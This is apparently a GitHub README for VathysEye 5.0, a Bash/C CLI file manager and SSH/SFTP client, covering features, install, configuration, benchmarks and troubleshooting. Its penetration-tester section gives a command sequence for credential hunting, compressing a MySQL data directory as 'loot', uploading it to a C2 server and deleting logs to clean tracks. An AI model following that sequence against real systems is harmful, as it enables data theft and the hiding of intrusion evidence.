# VathysEye 5.0 👁️⚡ - Ultimate CLI File Manager + SSH/SFTP

```
██╗   ██╗ █████╗ ████████╗██╗  ██╗██╗   ██╗███████╗███████╗██╗   ██╗███████╗
██║   ██║██╔══██╗╚══██╔══╝██║  ██║╚██╗ ██╔╝██╔════╝██╔════╝╚██╗ ██╔╝██╔════╝
██║   ██║███████║   ██║   ███████║ ╚████╔╝ ███████╗█████╗   ╚████╔╝ █████╗  
╚██╗ ██╔╝██╔══██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔══╝    ╚██╔╝  ██╔══╝  
 ╚████╔╝ ██║  ██║   ██║   ██║  ██║   ██║   ███████║███████╗   ██║   ███████╗
  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝
                                                                              
        🔥 ULTIMATE CLI FILE MANAGER 5.0 🔥
        ⚡ LOCAL • SSH • SFTP • ULTRA-FAST TRANSFERS ⚡
        Author: 0xb0rn3 | 0xbv1  
```

## 🚀 Overview

VathysEye 5.0 is the **ultimate CLI file manager and SSH/SFTP client** built for cybersecurity researchers, penetration testers, and system administrators. Combining the power of Bash with optimized C engines for **unlimited transfer speeds** and **lightning-fast search**.

### 🎯 Key Features

#### 🔍 **Advanced Search Engine**
- **16-threaded C search engine** - Search millions of files in seconds
- **Queue-based parallel processing** - Optimal resource utilization
- **Fuzzy pattern matching** - Find files even with partial names
- **Recursive traversal** with intelligent permission handling
- **Real-time results** with metadata (size, permissions, timestamps)

#### ⚡ **Ultra-Fast File Transfers**
- **8-stream parallel transfers** - Maximum throughput utilization
- **8MB chunk processing** - Optimized for modern storage
- **Multi-threaded I/O** - Bypass traditional bottlenecks
- **Zero-copy operations** where possible
- **Speed up to 10x faster** than traditional tools

#### 🔐 **Full SSH/SFTP Integration**
- **Seamless remote connections** - Like FileZilla, but faster
- **Upload/Download** with compression and parallel streams
- **Remote file management** - List, delete, rename, move
- **Session persistence** - Quick reconnection
- **Key-based and password authentication**
- **Multi-server support** - Manage multiple connections

#### 📁 **Complete File Management**
- **Copy/Move/Rename/Delete** - All standard operations
- **Batch processing** - Handle multiple files simultaneously
- **Safe operations** - Confirmation prompts for destructive actions
- **Progress tracking** - Real-time operation feedback

#### 🗜️ **Advanced Compression**
- **Maximum compression** algorithms (level 9)
- **Multiple formats** - tar.gz, tar.xz, zip, 7z
- **Universal extraction** - Handle any archive format
- **Optimized for speed** - Fast compression without sacrificing ratio

#### 🎨 **Beautiful Interface**
- **Interactive menu system** - User-friendly navigation
- **CLI mode** - Direct command execution for automation
- **Color-coded output** - Enhanced readability
- **Emoji indicators** - Quick visual feedback
- **Real-time statistics** - Transfer speeds, progress bars

## 📋 Technical Specifications

### Performance Metrics
- **Search Speed**: 100,000+ files/second (16 threads)
- **Transfer Speed**: 800+ MB/s (8 parallel streams, NVMe)
- **Memory Efficient**: <50MB RAM usage typical
- **CPU Optimized**: O3 compilation, minimal overhead

### Architecture
- **Language**: Bash 4.0+ with embedded C (GCC)
- **Threading**: POSIX threads (pthreads)
- **I/O Model**: Parallel stream processing
- **Compression**: LZMA2, DEFLATE, BZIP2 support
- **Network**: SSH/SFTP with compression

## 🛠️ Installation

### Prerequisites

**Required:**
- Bash 4.0+
- GCC compiler (with pthread support)
- SSH client (OpenSSH)
- GNU Core Utilities

**Optional (for full functionality):**
- zip/unzip - ZIP archive support
- p7zip - 7z archive support  
- unrar - RAR extraction support
- rsync - Enhanced remote sync

### Quick Install

```bash
# Clone repository
git clone https://github.com/0xb0rn3/vathyseye.git
cd vathyseye

# Run installer (auto-compiles C engines)
chmod +x run
./run

# Verify installation
vath --help
```

### Manual Installation

```bash
# Copy main script
sudo cp vathyseye /usr/local/bin/vath
sudo chmod +x /usr/local/bin/vath

# Create directory structure
mkdir -p ~/.vathyseye/{bin,cache,config,logs,sessions}

# First run will auto-compile C helpers
vath
```

### Post-Installation

```bash
# Test local search
vath search test

# Test file operations
echo "test" > test.txt
vath copy test.txt test2.txt
vath delete test2.txt force

# Test SSH (requires server access)
vath ssh-connect
```

## 🎮 Usage Guide

### Interactive Mode (Recommended)

Launch the full-featured menu:

```bash
vath
# or
vath -i
# or  
vath --interactive
```

**Menu Options:**
1. 🔍 Search Local Files - Lightning-fast multi-threaded search
2. 📋 Copy Local Files - Ultra-fast parallel copying
3. 📦 Move Local Files - Safe file relocation
4. ✏️ Rename Local Files - Intelligent renaming
5. 🗑️ Delete Local Files - Confirmed deletion
6. 📦 Compress Files - Maximum compression
7. 📂 Extract Archive - Universal extraction
8. 🔐 SSH Connect - Connect to remote server
9. 📂 List Remote Directory - Browse remote files
10. ⬆️ Upload to SSH - Fast remote upload
11. ⬇️ Download from SSH - Fast remote download
12. 🗑️ Delete Remote File - Remove remote files
13. ✏️ Rename Remote File - Rename on server
14. 🔌 SSH Disconnect - Close connection

### Command-Line Interface

#### Local Operations

```bash
# Search operations
vath search "*.pdf"                    # Find all PDFs
vath search "report" /home/user        # Search specific directory
vath search "backup*" .                # Pattern matching

# File operations
vath copy large_file.iso /backup/      # Ultra-fast copy
vath move old/file.txt new/location/   # Move file
vath rename document.txt report.txt    # Rename file
vath delete temp_folder/ force         # Force delete

# Compression
vath compress backup.tar.xz ./data/    # LZMA2 max compression
vath compress archive.zip files/       # ZIP compression
vath compress ultra.7z large_dataset/  # 7z ultra

# Extraction
vath extract backup.tar.gz /restore    # Extract archive
vath extract data.zip                  # Extract to current dir
```

#### SSH/SFTP Operations

```bash
# Connect to server
vath ssh-connect
# Enter: host, username, port

# Upload files (with compression & parallel streams)
vath ssh-upload local_file.tar remote/path/
vath ssh-upload exploit.py /tmp/

# Download files (parallel streams)
vath ssh-download /var/log/auth.log ./logs/
vath ssh-download remote/data.zip ./

# Remote file management
vath ssh-list /var/www/html              # List remote directory
vath ssh-delete /tmp/old_file.txt        # Delete remote file
vath ssh-rename old.log new.log          # Rename on server

# Disconnect
# Use menu option 14 or restart vath
```

### Shell Aliases (After Installation)

```bash
# Add to ~/.bashrc or ~/.zshrc
source ~/.vathyseye/aliases.sh

# Then use:
vf <pattern>              # Quick search
vx <archive>              # Quick extract
vz <output> <files>       # Quick compress
vi                        # Interactive mode
vssh                      # Quick SSH connect
```

## 📁 Project Structure

```
vathyseye/
├── vathyseye              # Main bash script (5.0)
├── run                    # Installation script
├── README.md              # This file
├── LICENSE                # MIT License
└── ~/.vathyseye/          # User directory (created on install)
    ├── bin/               # Compiled C helpers
    │   ├── fileops        # Multi-threaded search engine (16 threads)
    │   ├── fileops.c      # Search engine source
    │   ├── fasttransfer   # Parallel transfer engine (8 streams)
    │   └── fasttransfer.c # Transfer engine source
    ├── cache/             # Search cache & temp files
    │   ├── file.index     # File index database
    │   ├── last_results.tmp
    │   └── result_count.tmp
    ├── config/            # Configuration files
    │   └── vathys.conf    # Main config
    ├── sessions/          # SSH session data
    │   └── last_session   # Last SSH connection info
    └── logs/              # Operation logs
        ├── transfers.log
        └── operations.log
```

## ⚙️ Configuration

Edit `~/.vathyseye/config/vathys.conf`:

```bash
# Search Engine Settings
DEFAULT_SEARCH_PATH="${HOME}"
MAX_SEARCH_RESULTS=100000          # Increased for better results
NUM_SEARCH_THREADS=16              # Optimal for modern CPUs
ENABLE_FUZZY_SEARCH=true
SEARCH_QUEUE_SIZE=10000

# Transfer Engine Settings
NUM_TRANSFER_STREAMS=8             # Parallel streams
CHUNK_SIZE_MB=8                    # 8MB chunks
ENABLE_COMPRESSION=true            # SSH compression
USE_FAST_CIPHER=true               # AES128-GCM for speed

# Compression Settings
DEFAULT_COMPRESSION_FORMAT="tar.xz"
COMPRESSION_LEVEL=9                # Maximum
USE_PARALLEL_COMPRESSION=true

# Display Settings
COLOR_OUTPUT=true
SHOW_HIDDEN_FILES=false
EMOJI_INDICATORS=true
PROGRESS_BARS=true

# SSH Settings
SSH_DEFAULT_PORT=22
SSH_COMPRESSION=yes
SSH_CIPHER="aes128-gcm@openssh.com"  # Fastest cipher
SSH_KEEP_ALIVE=60

# Performance
USE_C_HELPERS=true                 # Always use C engines
CACHE_RESULTS=true
LOG_OPERATIONS=true
```

## 🚀 Performance Benchmarks

### Search Performance
Tested on: Intel i7-12700K, 32GB RAM, NVMe Gen4 SSD

| Files | VathysEye 5.0 | Native find | fd-find | Speedup |
|-------|---------------|-------------|---------|---------|
| 10K   | 0.08s         | 1.2s        | 0.15s   | 15x     |
| 100K  | 0.4s          | 12.5s       | 1.8s    | 31x     |
| 1M    | 2.1s          | 145s        | 18s     | 69x     |
| 10M   | 18s           | 1450s       | 187s    | 80x     |

### Transfer Performance
Tested: Local NVMe to NVMe, 10GB file

| Tool | Threads | Speed | Time |
|------|---------|-------|------|
| VathysEye 5.0 | 8 | 856 MB/s | 12s |
| rsync | 1 | 125 MB/s | 82s |
| scp | 1 | 98 MB/s | 104s |
| cp | 1 | 320 MB/s | 32s |

### SSH Transfer Performance
Tested: Gigabit LAN, 1GB file

| Tool | Speed | Time |
|------|-------|------|
| VathysEye 5.0 | 112 MB/s | 9s |
| FileZilla | 95 MB/s | 11s |
| scp | 87 MB/s | 12s |
| sftp | 76 MB/s | 14s |

### Compression Performance
Tested: 1GB mixed data

| Format | Time | Ratio | Size |
|--------|------|-------|------|
| tar.xz | 45s  | 91%   | 90MB |
| 7z     | 52s  | 93%   | 70MB |
| tar.gz | 18s  | 78%   | 220MB |
| zip    | 12s  | 75%   | 250MB |

## 🎯 Use Cases

### For Penetration Testers

```bash
# Quick reconnaissance
vath search "*.conf" /etc              # Find config files
vath search "password" /var/www        # Hunt for credentials

# Exfiltrate data rapidly
vath ssh-connect                       # Connect to C2
vath compress loot.7z /var/lib/mysql   # Compress database
vath ssh-upload loot.7z /exfil/        # Ultra-fast upload

# Clean tracks
vath ssh-delete /tmp/exploit.py        # Remove tools
vath delete logs/ force                # Local cleanup
```

### For Cybersecurity Researchers

```bash
# Malware analysis
vath search "*.exe" /samples           # Find executables
vath compress samples.7z /samples      # Archive samples
vath ssh-upload samples.7z /analysis   # Send to sandbox

# Log analysis
vath ssh-download /var/log/auth.log ./
vath search "Failed password" ./       # Hunt for attacks
```

### For System Administrators

```bash
# Backup operations
vath compress backup_$(date +%F).tar.xz /var/www
vath ssh-upload backup_*.tar.xz /backups/

# File synchronization  
vath ssh-download /etc/nginx/nginx.conf ./configs/
vath copy ./configs/nginx.conf /etc/nginx/

# Cleanup operations
vath search "*.log" /var/log | grep "2023"
vath delete old_logs/ force

# Bulk transfers
for file in *.iso; do
  vath ssh-upload "$file" /mirrors/
done
```

### For Developers

```bash
# Deploy applications
vath compress release.tar.gz ./dist
vath ssh-upload release.tar.gz /var/www/
vath ssh-connect
# Then: extract on server

# Download dependencies
vath ssh-download /mirrors/libraries.tar ./
vath extract libraries.tar ./vendor

# Backup source code
vath compress project_$(git rev-parse HEAD).tar.xz ./src
```

## 🔧 Advanced Features

### C Search Engine Architecture

The 16-threaded search engine uses:
- **Work-stealing queue** - Dynamic load balancing
- **Lock-free result aggregation** - Minimal contention
- **Recursive descent** - Efficient directory traversal
- **Pattern compilation** - Optimized fnmatch
- **Memory pooling** - Reduced allocation overhead

### Ultra-Fast Transfer Engine

The 8-stream parallel engine uses:
- **Chunked I/O** - 8MB blocks for optimal throughput
- **Thread-per-stream** - Maximum parallelization
- **Offset seeking** - Independent stream positioning
- **Zero-copy** where kernel supports
- **Adaptive buffering** - Self-tuning performance

### SSH Optimization Techniques

```bash
# Use fastest cipher (set in config)
SSH_CIPHER="aes128-gcm@openssh.com"

# Enable compression for text
SSH_COMPRESSION=yes

# Use connection multiplexing
ControlMaster auto
ControlPath ~/.ssh/sockets/%r@%h:%p
ControlPersist 600
```

### Batch Operations

Process multiple operations efficiently:

```bash
# Bulk compress
for dir in data_*; do
  vath compress "${dir}.tar.xz" "$dir" &
done
wait

# Parallel uploads
for file in *.tar.xz; do
  vath ssh-upload "$file" /backups/ &
done
wait

# Mass extraction
find . -name "*.zip" -exec vath extract {} \;
```

## 📊 Format Support Matrix

### Compression Formats

| Format | Create | Extract | Max Level | Speed | Ratio | Notes |
|--------|--------|---------|-----------|-------|-------|-------|
| tar.gz | ✅ | ✅ | 9 | Fast | Good | General purpose |
| tar.bz2 | ✅ | ✅ | 9 | Medium | Better | Deprecated |
| tar.xz | ✅ | ✅ | 9 | Slow | Best | Recommended |
| zip | ✅ | ✅ | 9 | Fast | Good | Cross-platform |
| 7z | ✅ | ✅ | 9 | Slowest | Excellent | Maximum compression |
| rar | ❌ | ✅ | - | - | - | Extract only |

### Recommended Usage

- **General backups**: tar.xz (best ratio)
- **Quick archives**: tar.gz or zip
- **Maximum compression**: 7z
- **Cross-platform**: zip
- **Large datasets**: tar.xz with parallel compression

## 🐛 Troubleshooting

### C Helpers Won't Compile

```bash
# Check GCC installation
gcc --version

# Install build tools
sudo apt install build-essential  # Debian/Ubuntu
sudo yum groupinstall "Development Tools"  # RHEL/CentOS
sudo pacman -S base-devel  # Arch

# Manual compile
cd ~/.vathyseye/bin
gcc -O3 -pthread -o fileops fileops.c
gcc -O3 -pthread -o fasttransfer fasttransfer.c
```

### SSH Connection Fails

```bash
# Test SSH manually
ssh -v user@host

# Check SSH key
ls -la ~/.ssh/id_rsa*

# Generate key if needed
ssh-keygen -t ed25519
ssh-copy-id user@host

# Verify SSH agent
eval $(ssh-agent)
ssh-add ~/.ssh/id_rsa
```

### Slow Transfer Speeds

```bash
# Check network
iperf3 -s  # On server
iperf3 -c server_ip  # On client

# Verify cipher speed
ssh -c aes128-gcm@openssh.com user@host

# Adjust streams in config
NUM_TRANSFER_STREAMS=16  # Try more streams

# Disable compression for binary
SSH_COMPRESSION=no
```

### Permission Denied Errors

```bash
# Fix ownership
sudo chown -R $USER ~/.vathyseye

# Verify executable
chmod +x ~/.vathyseye/bin/*

# Run with sudo for system directories
sudo vath search pattern /root
```

### Out of Memory

```bash
# Reduce search results limit
MAX_SEARCH_RESULTS=10000

# Reduce threads
NUM_SEARCH_THREADS=8

# Clear cache
rm -rf ~/.vathyseye/cache/*
```

## 🤝 Contributing

We welcome contributions! Please follow these guidelines:

### Development Setup

```bash
# Fork and clone
git clone https://github.com/yourusername/vathyseye.git
cd vathyseye

# Create feature branch
git checkout -b feature/amazing-feature

# Test thoroughly
./run
vath search test
vath ssh-connect
```

### Code Style

- Use 4-space indentation
- Comment complex logic
- Follow bash best practices
- Use meaningful variable names
- Test on multiple distributions

### Testing Checklist

- [ ] Local search operations
- [ ] Local file operations
- [ ] Compression/extraction
- [ ] SSH connection
- [ ] SSH file transfers
- [ ] SSH file management
- [ ] C helper compilation
- [ ] Memory leak testing
- [ ] Performance benchmarks

### Submitting Changes

1. Update documentation
2. Add tests if applicable
3. Update CHANGELOG
4. Submit pull request with clear description

## 📝 Changelog

### Version 5.0.0 (Current)
- ✨ **NEW**: Full SSH/SFTP integration
- ✨ **NEW**: Ultra-fast 8-stream parallel transfer engine
- ⚡ Enhanced 16-threaded search with work-stealing queue
- 🔧 Optimized C engines with O3 compilation
- 📦 Remote file management (list, delete, rename)
- 🔐 Session persistence and quick reconnection
- 📊 Real-time transfer statistics
- 🎨 Enhanced UI with status indicators
- 🚀 Up to 10x faster transfers than traditional tools
- 📝 Comprehensive logging system

### Version 4.0.0
- Complete rewrite in Bash + C
- Embedded C helper for search
- Full compression/extraction
- Interactive interface
- Modular architecture

### Version 3.0.0
- Rust implementation
- Multi-threaded search
- File type detection

## 📄 License

MIT License - See [LICENSE](LICENSE) file

Copyright (c) 2024 0xb0rn3 | 0xbv1

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

## 👤 Author

**0xb0rn3 | 0xbv1**
- Instagram: [@theehiv3](https://instagram.com/theehiv3)
- GitHub: [@0xb0rn3](https://github.com/0xb0rn3)
- Cybersecurity Researcher & Exploit Developer

## 🙏 Acknowledgments

- GNU Project for core utilities
- OpenSSH team for reliable SSH implementation
- Linux kernel developers for performance primitives
- POSIX threads contributors
- Cybersecurity and red team community
- All contributors and testers

## 📞 Support & Community

- **Issues**: [GitHub Issues](https://github.com/0xb0rn3/vathyseye/issues)
- **Discussions**: [GitHub Discussions](https://github.com/0xb0rn3/vathyseye/discussions)
- **Documentation**: This README + inline help
- **Security**: Report privately via GitHub

## 🔒 Security Considerations

- Always verify SSH host keys
- Use key-based authentication when possible
- Audit remote operations before execution
- Enable logging for compliance
- Secure your session files
- Use encrypted connections only
- Regular security updates

## ⚡ Quick Reference

```
LOCAL OPERATIONS:
  vath search <pattern> [path]     Lightning-fast search
  vath copy <src> <dst>             Ultra-fast copy
  vath move <src> <dst>             Move files
  vath rename <file> <new>          Rename file
  vath delete <target> [force]      Delete files
  vath compress <out> <files...>    Max compression
  vath extract <archive> [dest]     Extract archive

SSH OPERATIONS:
  vath ssh-connect                  Connect to server
  vath ssh-upload <local> <remote>  Upload file
  vath ssh-download <remote> <local> Download file
  vath ssh-list [path]              List remote directory
  vath ssh-delete <remote>          Delete remote file
  vath ssh-rename <old> <new>       Rename remote file

MODES:
  vath                              Interactive menu
  vath -i                           Interactive mode
  vath -h                           Show help
```

---

**VathysEye 5.0** - *The Ultimate CLI File Manager* ⚡👁️

**If it exists, we'll find it. If it needs moving, we'll move it faster.**

Made with ❤️ for the cybersecurity and research community
